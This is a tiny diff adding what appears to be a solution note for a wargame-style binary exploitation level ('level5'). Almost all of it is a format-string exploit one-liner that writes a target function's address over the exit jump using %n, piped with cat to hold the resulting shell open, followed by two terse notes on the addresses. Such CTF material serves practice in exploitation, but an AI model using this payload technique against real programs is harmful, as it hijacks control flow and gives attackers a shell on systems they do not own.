@@ -1,0 +1,4 @@
+(python -c 'print "\x90\x83\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5
+
+first . addr of exit jump
+second . o func addr in decimal
